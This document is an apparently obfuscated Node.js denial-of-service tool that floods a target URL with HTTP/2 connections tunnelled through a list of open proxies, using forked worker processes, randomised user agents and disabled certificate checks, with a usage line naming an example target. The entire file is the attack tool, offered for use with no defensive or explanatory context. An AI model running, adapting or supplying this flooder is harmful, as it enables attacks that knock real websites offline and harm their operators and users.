const net = require("net");
const http2 = require("http2");
const tls = require('tls');
const cluster = require("cluster");
const url = require("url");
const UserAgent = require("user-agents");
const fs = require('fs');
process.on("uncaughtException", function (_0x262a8c) {});
process.setMaxListeners(0x0);
require('events').EventEmitter.defaultMaxListeners = 0x0;
if (process.argv.length < 0x7) {
  console.log("Usage: node tls.js URL TIME R/S THREADS PROXYFILE\nExample: node tls.js https://lyar-fix-ur-api.rip 120 8 1 http.txt");
  process.exit();
}
const headers = {};
function readLines(_0x10425b) {
  return fs.readFileSync(_0x10425b, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x511ae9, _0x50355c) {
  return Math.floor(Math.random() * (_0x50355c - _0x511ae9) + _0x511ae9);
}
function randomElement(_0x5b64d4) {
  return _0x5b64d4[Math.floor(Math.random() * (_0x5b64d4.length - 0x0) + 0x0)];
}
const args = {
  'target': process.argv[0x2],
  'time': ~~process.argv[0x3],
  'Rate': ~~process.argv[0x4],
  'threads': ~~process.argv[0x5],
  'proxyFile': process.argv[0x6]
};
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x455766, _0x404df7) {
    const _0x3c53b4 = "CONNECT " + _0x455766.address + ":443 HTTP/1.1\r\nHost: " + _0x455766.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x3a93b9 = new Buffer.from(_0x3c53b4);
    const _0x2cc4ae = net.connect({
      'host': _0x455766.host,
      'port': _0x455766.port
    });
    _0x2cc4ae.setTimeout(_0x455766.timeout * 0x2710);
    _0x2cc4ae.setKeepAlive(true, 0x186a0);
    _0x2cc4ae.on("connect", () => {
      _0x2cc4ae.write(_0x3a93b9);
    });
    _0x2cc4ae.on("data", _0x40f98b => {
      const _0x30b3a7 = _0x40f98b.toString("utf-8");
      const _0x3a8202 = _0x30b3a7.includes("HTTP/1.1 200");
      if (_0x3a8202 === false) {
        _0x2cc4ae.destroy();
        return _0x404df7(undefined, "error: invalid response from proxy server");
      }
      return _0x404df7(_0x2cc4ae, undefined);
    });
    _0x2cc4ae.on('timeout', () => {
      _0x2cc4ae.destroy();
      return _0x404df7(undefined, "error: timeout exceeded");
    });
    _0x2cc4ae.on("error", _0x3b7d44 => {
      _0x2cc4ae.destroy();
      return _0x404df7(undefined, "error: " + _0x3b7d44);
    });
  }
}
const Socker = new NetSocket();
headers[":method"] = "GET";
headers[':path'] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = '/';
headers["accept-language"] = "en-US,en;q=0.9";
headers['accept-encoding'] = "gzip, deflate";
headers["cache-control"] = "no-cache";
headers['upgrade-insecure-requests'] = '1';
headers["x-requested-with"] = "XMLHttpRequest";
function runFlooder() {
  const _0x5e40cf = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x37cb09 = _0x5e40cf.split(':');
  const _0x586805 = new UserAgent();
  var _0x525ac5 = _0x586805.toString();
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = _0x525ac5;
  const _0x20d74a = {
    'host': _0x37cb09[0x0],
    'port': ~~_0x37cb09[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0xf
  };
  Socker.HTTP(_0x20d74a, (_0x2088c2, _0x4218b4) => {
    if (_0x4218b4) {
      return;
    }
    _0x2088c2.setKeepAlive(true, 0x927c0);
    const _0x5686e2 = {
      'ALPNProtocols': ['h2'],
      'rejectUnauthorized': false,
      'servername': url.hostname,
      'socket': _0x2088c2,
      'secure': true,
      'servername': parsedTarget.host
    };
    const _0x5254ff = tls.connect(0x1bb, parsedTarget.host, _0x5686e2);
    _0x5254ff.setKeepAlive(true, 600000);
    const _0x45ecbb = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x3e8,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xd05,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x5254ff,
      'socket': _0x2088c2
    });
    _0x45ecbb.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x3e8,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x45ecbb.on("connect", () => {});
    _0x45ecbb.on("close", () => {
      _0x45ecbb.destroy();
      _0x2088c2.destroy();
      return;
    });
    _0x45ecbb.on("error", _0x4961ed => {
      _0x45ecbb.destroy();
      _0x2088c2.destroy();
      return;
    });
  });
}
const KillScript = () => process.exit(0x1);
setTimeout(KillScript, args.time * 0x3e8);